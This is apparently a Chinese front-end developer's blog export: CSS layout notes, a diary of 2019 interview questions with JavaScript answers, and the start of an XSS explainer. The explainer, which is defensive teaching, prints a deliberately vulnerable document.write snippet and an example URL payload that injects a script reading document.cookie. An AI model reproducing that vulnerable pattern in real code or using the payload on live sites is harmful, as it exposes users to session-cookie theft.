等于当前字体尺寸的两倍。例如，如果某元素以 12pt 显示，那么 2em 是24pt。在 CSS 中，em 是非常有用的单位，因为它可以自动适应用户所使用的字体。 ex 一个 ex 是一个字体的 x-height。 (x-height 通常是字体尺寸的一半。) pt 磅 (1 pt 等于 1/72 英寸) pc 12 点活字 (1 pc 等于 12 点) px 像素 (计算机屏幕上的一个点) 选择器 盒模型border-box content-box BFC块格式化上下文Box 是 CSS 布局的对象和基本单位，页面是由若干个Box组成的。 元素的类型 和 display 属性，决定了这个 Box 的类型。不同类型的 Box 会参与不同的 Formatting Context。 Formatting Context Formatting Context 是页面的一块渲染区域，并且有一套渲染规则，决定了其子元素将如何定位，以及和其它元素的关系和相互作用。 Formatting Context 有 BFC (Block formatting context)，IFC (Inline formatting context)，FFC (Flex formatting context) 和 GFC (Grid formatting context)。FFC 和 GFC 为 CC3 中新增。 BFC布局规则 BFC内，盒子依次垂直排列。 BFC内，两个盒子的垂直距离由 margin 属性决定。属于同一个BFC的两个相邻Box的margin会发生重叠【符合合并原则的margin合并后是使用大的margin】 BFC内，每个盒子的左外边缘接触内部盒子的左边缘（对于从右到左的格式，右边缘接触）。即使在存在浮动的情况下也是如此。除非创建新的BFC。 BFC的区域不会与float box重叠。 BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。 计算BFC的高度时，浮动元素也参与计算。 如何创建BFC 根元素或其它包含它的元素 浮动元素 (元素的 float 不是 none) 绝对定位元素 (元素具有 position 为 absolute 或 fixed) 内联块 (元素具有 display: inline-block) 表格单元格 (元素具有 display: table-cell，HTML表格单元格默认属性) 表格标题 (元素具有 display: table-caption, HTML表格标题默认属性) 具有overflow 且值不是 visible 的块元素， display: flow-root column-span: all 应当总是会创建一个新的格式化上下文，即便具有 column-span: all 的元素并不被包裹在一个多列容器中。 一个块格式化上下文包括创建它的元素内部所有内容，除了被包含于创建新的块级格式化上下文的后代元素内的元素。 BFC 的应用 防止 margin 重叠 (同一个BFC内的两个两个相邻Box的 margin 会发生重叠，触发生成两个BFC，即不会重叠) 清除内部浮动 (创建一个新的 BFC，因为根据 BFC 的规则，计算 BFC 的高度时，浮动元素也参与计算) 自适应多栏布局 (BFC的区域不会与float box重叠。因此，可以触发生成一个新的BFC) W3C对BFC的定义如下：1浮动元素和绝对定位元素，非块级盒子的块级容器（例如 inline-blocks, table-cells, 和 table-captions），以及overflow值不为“visiable”的块级盒子，都会为他们的内容创建新的BFC（块级格式上下文）。 为了便于理解，我们换一种方式来重新定义BFC。一个HTML元素要创建BFC，则满足下列的任意一个或多个条件即可： 1、float的值不是none。2、position的值不是static或者relative。3、display的值是inline-block、table-cell、flex、table-caption或者inline-flex4、overflow的值不是visible BFC是一个独立的布局环境，其中的元素布局是不受外界的影响，并且在一个BFC中，块盒与行盒（行盒由一行中所有的内联元素所组成）都会垂直的沿着其父元素的边框排列。 隐藏页面中的某个元素的方法有哪些？ 隐藏类型 屏幕并不是唯一的输出机制，比如说屏幕上看不见的元素（隐藏的元素），其中一些依然能够被读屏软件阅读出来（因为读屏软件依赖于可访问性树来阐述）。为了消除它们之间的歧义，我们将其归为三大类： 完全隐藏：元素从渲染树中消失，不占据空间。 视觉上的隐藏：屏幕中不可见，占据空间。 语义上的隐藏：读屏软件不可读，但正常占据空。 完全隐藏 1.display 属性 1display: none; 2.hidden 属性 HTML5 新增属性，相当于 display: none 12&lt;div hidden&gt;&lt;/div&gt; dipslay:none,visibility:hidden都会被构建DOM树 解析HTML构建DOM树在前面；而样式的加载在后面 dispaly:none的元素不会被加入到Render Tree 而visibility:hidden的元素会被加入到Render Tree； 视觉上的隐藏 1.利用 position 和 盒模型 将元素移出可视区范围 设置 posoition 为 absolute 或 fixed，通过设置 top、left 等值，将其移出可视区域。 12position:absolute;left: -99999px; 设置 position 为 relative，通过设置 top、left 等值，将其移出可视区域。 123position: relative;left: -99999px;height: 0 设置 margin 值，将其移出可视区域范围（可视区域占位）。 12margin-left: -99999px;height: 0; 2.利用 transfrom 缩放 12transform: scale(0);height: 0; 移动 translateX, translateY 12transform: translateX(-99999px);height: 0 旋转 rotate 1transform: rotateY(90deg); 3.设置其大小为0 宽高为0，字体大小为0： 123height: 0;width: 0;font-size: 0; 宽高为0，超出隐藏: 123height: 0;width: 0;overflow: hidden; 4.设置透明度为0 1opacity: 0; 5.visibility属性 1visibility: hidden; 6.层级覆盖，z-index 属性 12position: relative;z-index: -999; 再设置一个层级较高的元素覆盖在此元素上。 7.clip-path 裁剪 1clip-path: polygon(0 0, 0 0, 0 0, 0 0); 语义上的隐藏 aria-hidden 属性 读屏软件不可读，占据空间，可见。 12&lt;div aria-hidden="true"&gt;&lt;/div&gt; 圣杯布局和双飞翼布局的理解与思考https://www.jianshu.com/p/81ef7e7094e8 两侧宽度固定，中间宽度自适应 中间部分在DOM结构上优先，以便先行渲染 允许三列中的任意一列成为最高列 只需要使用一个额外的&lt;div&gt;标签]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_experience%2F</url>
    <content type="text"><![CDATA[前言 前端面试历程2019.0707.28多益-投递1.谈一谈对前端开发的理解，需要具备哪些知识和技术？你擅长哪方面？ 运用HTML、CSS、JavaScript技术，通过react、vue等框架实现前台交互页面（网页、小程序），给用户良好的交互体验。并作为用户到后台的中介，完成数据的收集、传递与展示。擅长页面的实现以及性能优化。 2.阐述你应聘该岗位的优势。（限100字） 具有UI库开发的经验，熟悉团队协作流程具有良好沟通能力、较强学习能力、团队协作精神，能承受工作压力 3.令人崩溃的在线评测 IQ题加奥数 07.31网易网易游戏通过手机登录投了两个岗位 互联网通过注册的CatcherInSky98@163.com又注册了一次 公众号通过身份证和手机号查询到的为163投递 2019.0808.03网易笔试 120分 20 单选 20 编程 （CSS写组件+用JavaScript写方法） 80 算法 https://www.nowcoder.com/discuss/216237 08.074399投简历 虎牙内推投简历 08.08网易转投客户端/服务端开发 需再次笔试 看岗位要求 08.09网易暂定客户端开发 多益em/rem 相对长度单位 em相对于父元素，rem相对于根元素元素 chrome默认的字体大小是12px，也就是1em默认为12px，如果最外层的父元素直接把font-size设为1.5em，那么该元素的字体大小为18px（12*1.5）。 堆排 初始化建堆的时间复杂度为O(n)，排序重建堆的时间复杂度为nlog(n) 因为堆排序是就地排序，空间复杂度为常数：O(1) background-color/image background-color背景颜色是包含边框border，边框如果不设置颜色，默认会采用文本颜色，而文本颜色默认是黑色。 background-image背景图片 background-image背景图片占据了元素的全部尺寸，包括内边距padding和边框border，但不包括外边距margin。 https://blog.csdn.net/weimob258616/article/details/89162851 SVG 路径 - 元素用于定义一个路径。 下面的命令可用于路径数据： M = moveto L = lineto H = horizontal lineto V = vertical lineto C = curveto S = smooth curveto Q = quadratic Bézier curve T = smooth quadratic Bézier curveto A = elliptical Arc Z = closepath 注意：以上所有命令均允许小写字母。大写表示绝对定位，小写表示相对定位。 123&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;path d=&quot;M150 0 L75 200 L225 200 Z&quot; /&gt;&lt;/svg&gt; 垃圾回收与内存泄漏 URL/URI 08.11网易笔试只能C/Java，做不动，告辞 字节跳动投了 快手08.25字节跳动笔试 100/400 快手笔试 08.27BIGO投了 电信投了 08.29字节视频面 UDP/TCP POST/GET POST安全性 HTTP/2.0 123456789101112131415给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。设计一个算法来计算你所能获取的最大利润。注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。示例 1:输入: [5,3,3,0,0,3,1,4]输出: 6function profits(arr)&#123; let n = arr.length,profit=0; for(let i=0;i&lt;n-1;i++)&#123; if(arr[i]&lt;arr[i+1])&#123; profit+=arr[i+1]-arr[i] &#125; &#125; return profit&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 * JS、CSS等静态资源路径，允许出现 &quot;..&quot;、&quot;.&quot; 、 &quot;//&quot;，请简化这些资源路径，把它们变成最短字符串。* 注：一个点（.）表示当前目录本身；此外，两个点 （..） 表示将目录切换到上一级（指向父目录）；两者都可以是复杂相对路径的组成部分。* &lt;script src=&quot;//s3.pstatp.com/eesz/.././resource/./bear/js//app.0fa757caa42b59caf8f0.js&quot;&gt;&lt;/script&gt;* 示例：//s3.pstatp.com/eesz/.././resource/./bear/js//app.0fa757caa42b59caf8f0.js* 结果：//s3.pstatp.com/resource/bear/js/app.0fa757caa42b59caf8f0.jsfunction shorten(str)&#123; let father = /\w+ \/ \. \. \//g // eesz/.. let self = /\.\//g //./ let double = /\/\//g str = str.replace(father,&quot;&quot;) str = str.replace(self,&quot;&quot;) str = str.replace(double,&quot;&quot;) return str&#125;function shorten2(str)&#123; let n = str.length,url = false; if(str.charAt(0)==&quot;/&quot;&amp;&amp;str.charAt(1)==&quot;/&quot;)&#123; url =true str = str.slice(2) &#125; let arr = str.split(&quot;/&quot;) for(let i = 0;i&lt; arr.length;i++)&#123; if(arr[i] === &quot;&quot;||arr[i]===&quot;.&quot;)&#123; arr.splice(i,1) i-- &#125;else if(arr[i]===&quot;..&quot;)&#123; arr.splice(i-1,2) i-=2 &#125; &#125; str = arr.join(&quot;/&quot;) if(url)&#123; str = &quot;//&quot;+str &#125; return str&#125;var simplifyPath = function(path) &#123; var result = &apos;&apos; var tempPath = [] var paths = path.split(&apos;/&apos;) paths.map(val =&gt; &#123; if(val &amp;&amp; val === &apos;..&apos;) &#123; tempPath.pop() &#125;else if(val &amp;&amp; val !== &apos;.&apos;) &#123; tempPath.push(val) &#125; &#125;) tempPath.length ? result = &apos;/&apos;+tempPath.join(&apos;/&apos;) : result = &apos;/&apos; return result&#125;; 2019.0909.02BIGO笔试 一、单选 SQL TCP/UDP 保留地址私有地址（内部局域网可以使用的） A级：10.0.0.0 - 10.255.255.255 B级：172.16.0.0 - 172.31.255.255 C级：192.168.0.0 - 192.168.255.255 保留地址（特殊用途的） A类：127.X.X.X B类：169.254.X.X 扩展保留地址 若干 匿名函数与闭包 栈 进程与线程 四次挥手 进程从运行变等待（输入或输出事件发生 ）进程的状态有就绪、运行和阻塞3种。当一个就绪进程被调度程序选中，则该进程就从就绪变为运行；当一个运行的进程等待某事件或者申请的资源得不到满足时，则该进程由运行变为阻塞；当一个阻塞的进程等待的事件发生时，则该进程由阻塞变为就绪；当一个进程的时间片用完时，则该进程由运行变为就绪。 Promise 稳定排序两个相等的元素排序过程不会交换位置堆排序、快速排序、希尔排序、直接选择排序是不稳定的排序算法，而基数排序、冒泡排序、直接插入排序、折半插入排序、归并排序是稳定的排序算法。 简单题 简单题 CSS IE9兼容animation？单位？flex：3IE9 不支持animation 多态作用：把不同的子类对象都当作父类来看，可以屏蔽不同子类对象之间的差异，写出通用的代码，做出通用的编程，以适应需求的不断变化。 赋值之后，父类型的引用就可以根据当前赋值给它的子对象的特性以不同的方式运作。也就是说，父亲的行为像儿子，而不是儿子的行为像父亲。 多态是面向对象的重要特性,简单点说:“一个接口，多种实现”，就是同一种事物表现出的多种形态。编程其实就是一个将具体世界进行抽象化的过程，多态就是抽象化的一种体现，把一系列具体事物的共同点抽象出来, 再通过这个抽象的事物, 与不同的具体事物进行对话。 HTNL标签 二、问答 数据类型、typeof返回值string undefined number null boolean object symbolstring undefined number object boolean object symbol function css三角形 正则 发布订阅模式 回文链表 新旧版本对比 字符串是否全由字典中元素拼成 SHEIN前端开发工程师 3k游戏09.05BIG以为一面很基础，看了一天的网络/浏览器/html/css 结果ES6+webpack+react 哎 Array/object 新方法 class继承 super super.p symbol set(NAN) map webpack loader pludgin react异步 virtual dom set getElement set 输出什么 09.10三七笔试 let const JS 模块 AMD·CMD ComconJS·ES6 私有地址 没记 $(document).ready() window.onload() 权限chmod chown 765 764 css优先级 css继承 http状态码 SQL语句 同源策略 display none visibility hidden BFC var提升 软件测试 概率题 作用域 this 完全二叉树节点数和高度 异步 异步加载 defer sync 股票LeetCode object数组去重 09.13投了一大波，我都忘记投了多少 09.14酷狗笔试 变量提升，立即执行函数匿名函数并不会提升 HTTPS 443 css优先 this Definition List列表标题 Title列表内容 DescriptionMonthSavings Row Head January$100Description 正则 HTTP状态码 LocalStorage 跨域 标准文档流 display:none不会使一个元素脱离标准文档流： （1）浮动 （2）绝对定位 （3）固定定位 HTTP 1.1支持长连接(PersistentConnection)和请求的流水线(Pipelining)处理 强制类型转换0==false trueundefined==0 falsenull==false false 优化 虚拟dom 内存 对象 不同步 跨域 生成随机播放列表 09.19 JSONJSON键/值对由键和值组成，键必须是字符串，用双引号包裹，值可以是字符串（string）、数值(number) 、对象（object）、数组（array）、true、false、null。 false+true//1(true+false)&gt;2//false(true+false)&gt;2+true//false 稀疏数组就是数组中多数成员没有有效的信息，只有少数成员有有效数据 service worker dipslay:none,visibility:hidden都会被构建DOM树解析HTML构建DOM树在前面；而样式的加载在后面 dispaly:none的元素不会被加入到Render Tree 而visibility:hidden的元素会被加入到Render Tree； transform:rotate(7deg); 理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。 基于TCP的应用层协议有：SMTP、TELNET、HTTP、FTP 基于UDP的应用层协议：DNS、TFTP（简单文件传输协议）、RIP（路由选择协议）、DHCP、BOOTP（是DHCP的前身）、IGMP（Internet组管理协议） DNS占用53号端口，同时使用TCP和UDP协议。 DNS区域传输的时候使用TCP协议 域名解析时使用UDP协议 font-size 回流 insertAfter()和insertBefore() insertAdjacentHTML iframe 0.8-0.6==0.2false//0.200000000000000070.2-0.1==0.1true setTimeout(()=&gt;{console.log(“”)},0)910 FTP21 SSH22 电报UDP 保证新型协议PUDP(Passive UDP)。该协议通过在传统TCP/IP协议的UPD层和应用层中间加入一层可靠UDP模块,保证数据的可靠传输,实现了基于UDP报文传输的可靠传输。 a = /ff/ b = /ff/ a!=b 09.20腾讯笔试，做得太贪了，老老实实一题一题做就能做两题多了 1.碰碰数 给一个数组和若干碰碰数组 数组按顺序组合 1234组合成 1 12 123 1234 2 23 234 3 34 4这种 但是出现碰碰数组则不算 求组合数 数组比较不能== 123456789101112131415161718192021222324252627282930313233343536373839404142function combo(arr,peng)&#123; let crr=[],ans=0; for(let i = 0;i&lt;arr.length;i++)&#123; crr = [] for(let j = i;j&lt;arr.length;j++)&#123; crr.push(arr[j]) if(crr.has(peng))&#123; console.log(&quot;break&quot;) break &#125;else&#123; ans++ console.log(crr) &#125; &#125; &#125; return ans&#125;Array.prototype.has = function(peng)&#123; if(this.length&lt;2)&#123; return false &#125;else&#123; let x = [this[this.length-2],this[this.length-1]]; for(let pe of peng)&#123; if(equar(x,pe))&#123; return true &#125; &#125; return false &#125;&#125;function equar(a, b) &#123; if (a.length !== b.length) &#123; return false &#125; else &#123; for (let i = 0; i &lt; a.length; i++) &#123; if (a[i] != b[i]) &#123; return false &#125; &#125; return true; &#125;&#125; 2.自动日期 验证闰年 合法化日期，自动计算迭代使日期在合理范围 输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445function run(year)&#123; if(year&gt;=3200)&#123; if(year%3200==0&amp;&amp;year%172800!=0)&#123; return false &#125; &#125; if(year%400==0)&#123; return true &#125;else if(year%4==0&amp;&amp;year%100!=0)&#123; return true &#125; return false&#125;function date(y,m,d)&#123; let x; run(y)?x=29:x=28; let mouth = [31,x,31,30,31,30,31,31,30,31,30,31]; while(d&gt;mouth[m-1])&#123; d -= mouth[m-1] m++ if(m&gt;12)&#123; y++ run(y)?x=29:x=28; m-=12 &#125; &#125; y+=&quot;&quot; m+=&quot;&quot; d+=&quot;&quot; while(y.length&lt;4)&#123; y=&quot;0&quot;+y &#125; while(m.length&lt;2)&#123; m=&quot;0&quot;+m &#125; while(d.length&lt;2)&#123; d=&quot;0&quot;+d &#125; return y+&quot;-&quot;+m+&quot;-&quot;+d&#125;let arr = readline().split(&quot; &quot;).map((it)=&gt;&#123; return parseInt(it)&#125;);console.log(date(arr[0],arr[1],arr[2])) 3.螺旋读二维数组 螺旋边数为数组长度N的2N-1 只需按顺序执行即可计算即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function lX(arr)&#123; let res = [],n = arr.length, lx = 2*n-1,times=0,i=0,j=0,mode=0,turn=0; while(times&lt;n*n)&#123; x = Math.floor(n-turn/2) if(mode==0)&#123; for(let k = 0;k&lt;x;k++)&#123; res.push(arr[i][j]) times++ j++ &#125; mode=1 turn++ j-- i++ &#125;else if(mode==1)&#123; for(let k = 0;k&lt;x;k++)&#123; res.push(arr[i][j]) times++ i++ &#125; mode=2 turn++ i-- j-- &#125;else if(mode==2)&#123; for(let k = x-1;k&gt;-1;k--)&#123; res.push(arr[i][j]) times++ j-- &#125; mode=3 turn++ j++ i-- &#125;else if(mode==3)&#123; for(let k = x-1;k&gt;-1;k--)&#123; res.push(arr[i][j]) times++ i-- &#125; mode=0 turn++ i++ j++ &#125; &#125; return res&#125;//[1, 2, 3, 6, 9, 8, 7, 4, 5]//[1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10]lX([[1,2,3,4],[5,6,7,8],[9,10,11,12],[13,14,15,16]])//[1, 2, 3, 4, 5, 10, 15, 20, 25, 24, 23, 22, 21, 16, 11, 6, 7, 8, 9, 14, 19, 18, 17, 12, 13] 4.超出字数按行截断 正则/\w\W$/ 5.FFT 09.21乐信 substr(start [，length]) 第一个字符的索引是0，start必选 length可选 substring(start [, end]) 第一个字符的索引是0，start必选 end可选 fetch号称是AJAX的替代品，是在ES6出现的，使用了ES6中的promise对象。Fetch是基于promise设计的。Fetch的代码结构比起ajax简单多了，参数有点像jQuery ajax。但是，一定记住fetch不是ajax的进一步封装，而是原生js，没有使用XMLHttpRequest对象。 域名一个完整的域名（.com、.net、.edu、.gov等）由二个或二个以上部分组成，各部分之间用英文的句号”.”来分隔，最后一个”.”的右边部分称为顶级域名 (Top-level Domain Name)，顶级域名“.”的左边部分称为二级域名 (Second-level Domain Name)，二级域名的左边部分称为三级域名，以此类推，每一级的域名控制它下一级域名的分配。1 com2 baidu.com3 pan.baidu.com Date 对象方法 | 方法 | 描述 || :———————————————————– | :—————————————————– || Date() | 返回当日的日期和时间。 || getDate() | 从 Date 对象返回一个月中的某一天 (1 ~ 31)。 || getDay() | 从 Date 对象返回一周中的某一天 (0 ~ 6)。 || getMonth() | 从 Date 对象返回月份 (0 ~ 11)。 || getFullYear() | 从 Date 对象以四位数字返回年份。 || getYear() | 请使用 getFullYear() 方法代替。 || getHours() | 返回 Date 对象的小时 (0 ~ 23)。 || getMinutes() | 返回 Date 对象的分钟 (0 ~ 59)。 || getSeconds() | 返回 Date 对象的秒数 (0 ~ 59)。 || getMilliseconds() | 返回 Date 对象的毫秒(0 ~ 999)。 || getTime() | 返回 1970 年 1 月 1 日至今的毫秒数。 || getTimezoneOffset() | 返回本地时间与格林威治标准时间 (GMT) 的分钟差。 || getUTCDate() | 根据世界时从 Date 对象返回月中的一天 (1 ~ 31)。 || getUTCDay() | 根据世界时从 Date 对象返回周中的一天 (0 ~ 6)。 || getUTCMonth() | 根据世界时从 Date 对象返回月份 (0 ~ 11)。 || getUTCFullYear() | 根据世界时从 Date 对象返回四位数的年份。 || getUTCHours() | 根据世界时返回 Date 对象的小时 (0 ~ 23)。 || getUTCMinutes() | 根据世界时返回 Date 对象的分钟 (0 ~ 59)。 || getUTCSeconds() | 根据世界时返回 Date 对象的秒钟 (0 ~ 59)。 || getUTCMilliseconds() | 根据世界时返回 Date 对象的毫秒(0 ~ 999)。 || parse() | 返回1970年1月1日午夜到指定日期（字符串）的毫秒数。 || setDate() | 设置 Date 对象中月的某一天 (1 ~ 31)。 || setMonth() | 设置 Date 对象中月份 (0 ~ 11)。 || setFullYear() | 设置 Date 对象中的年份（四位数字）。 || setYear() | 请使用 setFullYear() 方法代替。 || setHours() | 设置 Date 对象中的小时 (0 ~ 23)。 || setMinutes() | 设置 Date 对象中的分钟 (0 ~ 59)。 || setSeconds() | 设置 Date 对象中的秒钟 (0 ~ 59)。 || setMilliseconds() | 设置 Date 对象中的毫秒 (0 ~ 999)。 || setTime() | 以毫秒设置 Date 对象。 || setUTCDate() | 根据世界时设置 Date 对象中月份的一天 (1 ~ 31)。 || setUTCMonth() | 根据世界时设置 Date 对象中的月份 (0 ~ 11)。 || setUTCFullYear() | 根据世界时设置 Date 对象中的年份（四位数字）。 || setUTCHours() | 根据世界时设置 Date 对象中的小时 (0 ~ 23)。 || setUTCMinutes() | 根据世界时设置 Date 对象中的分钟 (0 ~ 59)。 || setUTCSeconds() | 根据世界时设置 Date 对象中的秒钟 (0 ~ 59)。 || setUTCMilliseconds() | 根据世界时设置 Date 对象中的毫秒 (0 ~ 999)。 || toSource() | 返回该对象的源代码。 || toString() | 把 Date 对象转换为字符串。 || toTimeString() | 把 Date 对象的时间部分转换为字符串。 || toDateString() | 把 Date 对象的日期部分转换为字符串。 || toGMTString() | 请使用 toUTCString() 方法代替。 || toUTCString() | 根据世界时，把 Date 对象转换为字符串。 || toLocaleString() | 根据本地时间格式，把 Date 对象转换为字符串。 || toLocaleTimeString() | 根据本地时间格式，把 Date 对象的时间部分转换为字符串。 || toLocaleDateString() | 根据本地时间格式，把 Date 对象的日期部分转换为字符串。 || UTC() | 根据世界时返回 1970 年 1 月 1 日 到指定日期的毫秒数。 || valueOf() | 返回 Date 对象的原始值。 | CTRL+F5刷新是指清空缓存 head 里面 是必须的 localStorage sessionStorage API一致 都不跨域 不跨浏览器 storage大小相同 可以用栈和队列模拟递归 如果父元素有{display: none;}的样式的话，子元素在样式表中的背景图片既不会渲染也不会加载，但是标签上的图片会被加载不会被渲染 09.23阿里电话面 面了一个小时，自我感觉良好，但是到现在没回音，GG，唯一不懂的貌似是这个 云，混合云 私有云等概念 09.254399 webscoket 同源？ 同源检测 不同文件夹下 概率 盒模型 borderbox width:200 padding:200 width=200px SEO 异步不利于 自闭 封装 十进制十六进制 JQ offset position sass chunks就是代码块的意思，多个chunk合在一起就是bundlewebpack-dev-server 支持2种自动刷新的方式： Iframe mode inline mode 这2种模式配置的方式和访问的路径稍微有点区别，最主要的区别还是 Iframe mode 是在网页中嵌入了一个 iframe ，将我们自己的应用注入到这个 iframe 当中去，因此每次你修改的文件后，都是这个 iframe 进行了 reload 。而 Inline-mode ，是 webpack-dev-server 会在你的 webpack.config.js 的入口配置文件中再添加一个入口,不过 Iframe mode 和 Inline mode 最后达到的效果都是一样的，都是监听文件的变化，然后再将编译后的文件推送到前端，完成页面的 reload 的。 无 [1&lt;2&lt;3,3&lt;2&lt;1][true, true] function foo(){}a = foo.nameconsole.log(a)//foofoo.name=”bar”console.log([a,foo.name])//[“foo”, “foo”] 跨域 this localStorageAPI n对括号，中间插入4399，输出数组 requestAnimationFrame CSS animation 移动云计算两面，面试官对化学专业背景的兴趣比技术问题还大，估计GG 一组有优先级数据的存储 单点登录 React·vue 特点 vue组件通信 HTTP请求头 popover组件父元素overflow：hidden情况的处理 09.26步步高1234567891011unction fn()&#123; var n = 99 function add()&#123; n+=1 &#125; function fn1()&#123; console.log(n) &#125; return fn1&#125;var result = fn()result()//99add()// Uncaught ReferenceError: add is not definedresult()//99 12345678910111213function Foo()&#123; function gN()&#123; console.log(1) &#125; //执行上下文一直在Foo里面不会用上 return this&#125;Foo.gN = function()&#123; console.log(2) &#125;Foo.prototype.gN= function()&#123; console.log(3) &#125;var gN=function()&#123; console.log(4) &#125;function gN()&#123; console.log(5) &#125;Foo.gN()//2gN()//4Foo().gN()//4 this.gN() window.gN()gN()//4 1235-&quot;2&quot;//3&quot;21&quot;&gt;3//true~4//-5 ~是按位取反 ^=是异或运算，相同取0，不同取1 12let x,&#123;x:y=1&#125;=&#123;x&#125;;y;//1console.log(x,y)//undefined 1 12345678function test()&#123; let re=[] for(var i=0;i&lt;10;i++)&#123; re[i]=function()&#123;return i&#125; &#125; return re&#125;test()[5]()//10 12345678910111213typeof(undefined)//&quot;undefined&quot;typeof(function()&#123;&#125;)//&quot;function&quot;typeof(99)//&quot;number&quot;typeof(&#123;a:1&#125;)//&quot;object&quot;typeof bar()//&quot;function&quot;function bar()&#123; return foo function foo()&#123;&#125;&#125;typeof &quot;$&#123;&#123;Object&#125;&#125;&quot;//&quot;string&quot;typeof &quot;$&#123;&#123;Object&#125;&#125;&quot;.prototype//&quot;undefined&quot;typeof &quot;$&#123;&#123;Object&#125;&#125;&quot;.isPrototypeOf//&quot;function&quot; CSS3 2D 转换 translate() rotate() scale() skew() matrix() html5自定义数据属性 data属性 123&lt;li data-type=&quot;veg&quot; data-distance=&quot;2miles&quot; data-identifier=&quot;10318&quot;&gt; Salad King&lt;/li&gt; tabindex 实例 带有指定的 tab 键导航顺序的链接 contenteditable可编辑 scope 属性规定此表头单元格是否是行、列、行组或列组的头部。 onKeyDown/Press/UP 三者在事件的响应上还有一点不同，就是onkeydown 、onkeypress事件响应的时候输入的字符并没有被系统接受，而响应onkeyup的时候，输入流已经被系统接受 onkeypress 这个事件在用户按下并放开任何字母数字键时发生。系统按钮（例如，箭头键和功能键）无法得到识别。 onkeyup 这个事件在用户放开任何先前按下的键盘键时发生。 onkeydown 这个事件在用户按下任何键盘键（包括系统按钮，如箭头键和功能键）时发生。 p块状元素 JQ插件开发 1234567891011121314//1.直接给jquer添加全局函数jQuery.myAlert=function (str) &#123; alert(str);&#125;;//2.用extend()方法。extend是jquery提供的一个方法，把多个对象合并起来，参数是objectjQuery.extend(&#123; myAlert2:function (str1) &#123; alert(str1); &#125;,&#125;);(function ($) &#123; $.fn.plugin=function () &#123; &#125;;&#125;)(jQuery); history.back()不是goback localstorage.clear不是clearItem Web Notifications.ClearAll() Notifications API 允许网页或应用程序在系统级别发送在页面外部显示的通知;这样即使应用程序空闲或在后台，Web应用程序也会向用户发送信息。本文将介绍在您自己的应用程序中使用此API的基础知识。 使用 FileReader() 构造器去创建一个新的 FileReader 没有readData方法 vue生命周期 设计模式 工厂 单例 装饰 中介 单例为了保证一个类只有一个实例，如果不存在便直接返回，如果存在便返回上一次的实例，其目的一般是为了资源优化。类实现是正统的实现，一般是放到类上，做静态方法。在实际项目中，一般这个应用会在一些通用UI上，比如mask，alert，toast，loading这类组件，还有可能是一些请求数据的model 装饰者模式的意图是为一个对象动态的增加一些额外职责；是类继承的另外一种选择，一个是编译时候增加行为，一个是运行时候。 中介者与代理模式的区别1，中介者模式：A，B之间的对话通过C来传达。A,B可以互相不认识（减少了A和B对象间的耦合）2，代理模式：A要送B礼物，A,B互相不认识，那么A可以找C来帮它实现送礼物的愿望（封装了A对象）]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_secure%2F</url>
    <content type="text"><![CDATA[前言 一、XSSXSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。 跨站脚本攻击有可能造成以下影响: 利用虚假输入表单骗取用户个人信息。 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。 显示伪造的文章或图片。 XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。 理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。 XSS 的攻击方式千变万化，但还是可以大致细分为几种类型。 1.非持久型 XSS（反射型 XSS ）非持久型 XSS 漏洞，一般是通过给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。 举一个例子，比如页面中包含有以下代码： 12345678910&lt;select&gt; &lt;script&gt; document.write('' + '&lt;option value=1&gt;' + location.href.substring(location.href.indexOf('default=') + 8) + '&lt;/option&gt;' ); document.write('&lt;option value=2&gt;English&lt;/option&gt;'); &lt;/script&gt;&lt;/select&gt; 攻击者可以直接通过 URL (类似：https://xxx.com/xxx?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;) 注入可执行的脚本代码。不过一些浏览器如Chrome其内置了一些XSS过滤器，可以防止大部分反射型XSS攻击。 非持久型 XSS 漏洞攻击有以下几点特征： 即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。 攻击者需要诱骗点击,必须要通过用户点击链接才能发起 反馈率低，所以较难发现和响应修复 盗取用户敏感保密信息 为了防止出现非持久型 XSS 漏洞，需要确保这么几件事情： Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。 尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染。 尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.createElement()等可执行字符串的方法。 如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义。 前端渲染的时候对任何的字段都需要做 escape 转义编码。 2.持久型 XSS（存储型 XSS）持久型 XSS 漏洞，一般存在于 Form 表单提交等交互功能，如文章留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。 举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容 主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，referer，forms 等，而是来源于后端从数据库中读出来的数据 。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。 